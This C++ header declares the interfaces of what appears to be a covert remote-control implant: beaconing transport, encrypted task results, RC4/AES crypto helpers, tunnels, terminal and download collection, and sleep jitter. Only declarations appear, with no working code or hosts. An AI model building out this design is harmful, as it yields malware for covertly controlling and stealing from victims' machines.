#pragma once
#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>
#include <functional>
#include <map>
#include <memory>

using bytes = std::vector<uint8_t>;

// transport interface
struct Transport {
    virtual ~Transport() = default;
    // Uploads an already-encrypted task-result blob and returns server data
    // (for HTTP this is the raw HTTP body; the main loop strips pre/suffix).
    virtual bool exchange(const bytes& payload, bytes& out) = 0;
    virtual bool needs_strip() const { return false; }
};

std::unique_ptr<Transport> make_transport(const bytes& beat, const bytes& session_key);

// msgpack minimal
bytes mp_map(const std::vector<std::pair<std::string, bytes>>& kv);
bytes mp_array(const std::vector<bytes>& items);
bytes mp_str(const std::string& s);
bytes mp_bin(const bytes& b);
bytes mp_u64(uint64_t v);
bytes mp_i64(int64_t v);
bytes mp_bool(bool v);
bytes mp_nil();

struct MpReader {
    bytes buf;
    size_t pos = 0;
    uint8_t peek();
    void skip();
    uint64_t read_u64();
    int64_t  read_i64();
    bool     read_bool();
    std::string read_str();
    bytes    read_bin();
    uint32_t read_map();
    uint32_t read_array();
    bool     read_nil();
    void     skip_value();
};

// crypto
bytes rc4_crypt(const bytes& data, const bytes& key);
bytes aes_gcm_encrypt(const bytes& plain, const bytes& key);
bool  aes_gcm_decrypt(const bytes& cipher, const bytes& key, bytes& plain);
bytes base64_encode(const bytes& data);
bool  base64_decode(const std::string& s, bytes& out);
bytes base32_encode_nopad(const bytes& data);
bool  base32_decode_nopad(const std::string& s, bytes& out);
bytes hex_decode(const std::string& s);
void  random_bytes(bytes& out, size_t n);

// agent core
struct SessionKeyHolder {
    static bytes skey;
};
std::pair<bytes,bytes> create_session_info();
int run_agent(int argc, char** argv);

// task engine
extern bool ACTIVE;
extern int  sleep_sec;
extern int  sleep_jit;
bytes task_process(const bytes& command_bytes);
std::vector<bytes> collect_tunnel_accepts();
std::vector<bytes> collect_tunnel_output();
std::vector<bytes> collect_terminal_output();
std::vector<bytes> collect_download_chunks();
void  set_payload_sleep(int sec, int jit);
void  cleanup_agent_resources();
